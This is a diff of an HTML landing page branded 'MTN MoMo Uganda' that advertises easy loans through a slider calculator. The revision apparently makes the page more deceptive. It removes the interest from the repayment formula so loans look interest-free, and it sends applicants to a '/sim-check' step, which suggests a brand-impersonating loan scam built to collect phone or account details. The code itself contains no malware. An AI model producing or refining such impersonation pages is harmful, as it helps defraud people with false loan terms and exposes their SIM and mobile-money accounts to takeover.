@@ -6,137 +6,114 @@
     <title>MTN MoMo - Uganda</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        * {
-            box-sizing: border-box;
-        }
+        * { box-sizing: border-box; }
         html, body {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            min-height: 100vh;
+            margin: 0; padding: 0; width: 100%; min-height: 100vh;
             background-color: #003366;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
-        
-        /* Mobile Header */
         .header-bar {
-            background-color: #002244;
-            padding: 16px;
-            text-align: center;
-            border-bottom: 3px solid #FFCC00;
+            background-color: #002244; padding: 14px 16px;
+            text-align: center; border-bottom: 2px solid rgba(255,204,0,0.2);
         }
-        .momo-badge {
-            background-color: #FFCC00;
-            color: #003366;
-            font-weight: 900;
-            font-size: 1.2rem;
-            padding: 4px 12px;
-            border-radius: 8px;
-            display: inline-block;
+        .momo-badge-wrapper { display: inline-block; position: relative; }
+        .new-tag {
+            position: absolute; top: -10px; right: -15px;
+            background-color: #FFCC00; color: #003366;
+            font-size: 0.65rem; font-weight: 800; padding: 1px 5px;
+            border-radius: 4px; text-transform: uppercase;
         }
-
-        /* Full Width Main Box */
+        .momo-brand { color: #ffffff; font-weight: 900; font-size: 1.4rem; }
+        .uganda-pill {
+            background-color: #FFCC00; color: #003366;
+            font-weight: 700; font-size: 0.8rem;
+            padding: 2px 12px; border-radius: 20px;
+            display: inline-block; margin-top: 6px;
+        }
         .main-content {
-            width: 100% !important;
-            max-width: 600px !important;
-            margin: 0 auto;
-            padding: 20px 16px;
-            background: #ffffff;
-            min-height: calc(100vh - 65px);
+            width: 100% !important; max-width: 550px !important;
+            margin: 0 auto; padding: 24px 16px;
+            background: #ffffff; min-height: calc(100vh - 85px);
+            border-top-left-radius: 24px; border-top-right-radius: 24px;
         }
-
-        /* Responsive Desktop Fallback */
         @media (min-width: 576px) {
-            body {
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                padding: 30px 15px;
-            }
+            body { display: flex; align-items: center; justify-content: center; padding: 30px 15px; }
             .header-bar { display: none; }
-            .main-content {
-                border-radius: 20px;
-                min-height: auto;
-                box-shadow: 0 12px 30px rgba(0,0,0,0.3);
-                padding: 30px 25px;
-            }
+            .main-content { border-radius: 24px; min-height: auto; box-shadow: 0 12px 35px rgba(0,0,0,0.4); padding: 35px 25px; }
         }
-
-        /* Form Controls & Typography */
-        .title-text {
-            color: #003366;
-            font-weight: 800;
-            font-size: 1.6rem;
-        }
+        .title-text { color: #1a1a1a; font-weight: 800; font-size: 1.5rem; }
         .calc-card {
-            background-color: #f8f9fa;
-            border-radius: 14px;
-            padding: 18px;
-            border: 1px solid #e2e8f0;
+            background-color: #fcfcfc; border-radius: 16px;
+            padding: 20px 16px; border: 1px solid #f0f0f0;
         }
+        .slide-hint {
+            background-color: #fff8e1; color: #b78103;
+            font-size: 0.75rem; font-weight: 700; padding: 4px 12px;
+            border-radius: 12px; display: inline-block; margin-bottom: 12px;
+        }
+        .form-range { accent-color: #FFCC00; }
         .btn-momo-primary {
-            background-color: #003366;
-            color: #FFCC00;
-            font-weight: 800;
-            font-size: 1.15rem;
-            padding: 16px;
-            border-radius: 12px;
-            border: none;
-            width: 100%;
-            letter-spacing: 0.5px;
-        }
-        .btn-momo-primary:active {
-            background-color: #001a33;
-        }
-        .form-range::-webkit-slider-thumb {
-            background: #003366;
+            background-color: #002244; color: #ffffff;
+            font-weight: 800; font-size: 1.05rem; padding: 16px;
+            border-radius: 14px; border: none; width: 100%;
         }
     </style>
 </head>
 <body>
 
-    <!-- Mobile Top Header -->
-    <div class="header-bar">
-        <span class="momo-badge">MM</span>
-        <span class="text-white fw-bold ms-2">from MTN</span>
+    <div class="header-bar d-sm-none">
+        <div class="momo-badge-wrapper">
+            <span class="new-tag">New</span>
+            <span class="momo-brand">MoMo</span>
+        </div>
+        <div class="text-white-50 small" style="font-size: 0.8rem;">from MTN Uganda</div>
+        <div><span class="uganda-pill">🇺🇬 Uganda</span></div>
     </div>
 
-    <!-- Main Adaptable Container -->
     <div class="main-content">
         <div class="text-center mb-3 d-none d-sm-block">
-            <span class="momo-badge">MM</span>
+            <div class="momo-badge-wrapper mb-1">
+                <span class="new-tag">New</span>
+                <span class="momo-brand fs-3 text-dark">MoMo</span>
+            </div>
+            <div class="text-muted small">from MTN Uganda</div>
+            <div><span class="uganda-pill mt-1">🇺🇬 Uganda</span></div>
         </div>
 
         <div class="text-center mb-4">
-            <h2 class="title-text mb-1">Welcome to MTN MoMo Uganda</h2>
-            <p class="text-muted small">Get loans easily through MTN MoMo Uganda</p>
+            <h2 class="title-text mb-1">Welcome to MTN MoMo 🇺🇬</h2>
+            <p class="text-muted small">Get loans easily through MTN MoMo in Uganda</p>
         </div>
 
         <div class="calc-card mb-4">
-            <div class="d-flex justify-content-between align-items-center mb-3">
-                <span class="fw-bold text-uppercase small text-secondary">Loan Calculator</span>
-            </div>
+            <div class="mb-3"><span class="fw-bold text-dark fs-6">Loan Calculator</span></div>
 
             <div class="d-flex justify-content-between align-items-center mb-2">
                 <span class="text-muted small">Amount</span>
-                <span class="fw-bold text-warning fs-5" id="displayAmount" style="color: #d9a000 !important;">UGX 1,000,000</span>
+                <span class="fw-bold fs-5" style="color: #d4af37;" id="displayAmount">UGX 1,000,000</span>
             </div>
 
             <div class="d-flex justify-content-between align-items-center mb-3">
                 <span class="text-muted small">Term</span>
-                <span class="fw-bold text-dark small" id="displayTerm">12 Months</span>
+                <span class="fw-bold" style="color: #d4af37;" id="displayTerm">48 Months</span>
             </div>
 
-            <input type="range" class="form-range mb-4" min="100000" max="5000000" step="50000" value="1000000" id="amountRange">
+            <div class="text-center mb-1"><span class="slide-hint">Slide to adjust loan amount</span></div>
 
-            <div class="p-3 bg-white rounded-3 border text-center">
-                <span class="text-muted small d-block mb-1">Monthly Payment</span>
-                <h3 class="fw-bold mb-0" style="color: #d9a000;" id="monthlyPayment">UGX 95,833</h3>
+            <input type="range" class="form-range mb-2" min="500000" max="5000000" step="50000" value="1000000" id="amountRange">
+
+            <div class="d-flex justify-content-between text-muted" style="font-size: 0.75rem;">
+                <span>UGX 500,000</span>
+                <span>UGX 5,000,000</span>
+            </div>
+
+            <div class="p-3 mt-3 bg-white rounded-3 border d-flex justify-content-between align-items-center shadow-sm">
+                <div><span class="text-muted small d-block" style="line-height: 1.2;">Monthly<br>Payment</span></div>
+                <div class="text-end"><h3 class="fw-bold mb-0" style="color: #d4af37;" id="monthlyPayment">UGX 20,834</h3></div>
             </div>
         </div>
 
-        <form action="/apply/step1" method="GET">
-            <input type="hidden" name="amount" id="hiddenAmount" value="1000000">
+        <form action="/sim-check" method="GET">
             <button type="submit" class="btn btn-momo-primary shadow-sm">START APPLICATION</button>
         </form>
     </div>
@@ -144,16 +121,12 @@
     <script>
         const range = document.getElementById('amountRange');
         const displayAmount = document.getElementById('displayAmount');
-        const hiddenAmount = document.getElementById('hiddenAmount');
         const monthlyPayment = document.getElementById('monthlyPayment');
 
         range.addEventListener('input', function() {
             const val = parseInt(this.value);
             displayAmount.textContent = 'UGX ' + val.toLocaleString();
-            hiddenAmount.value = val;
-            
-            // Calculate monthly repayment figure
-            const monthly = Math.round((val * 1.15) / 12);
+            const monthly = Math.round(val / 48);
             monthlyPayment.textContent = 'UGX ' + monthly.toLocaleString();
         });
     </script>
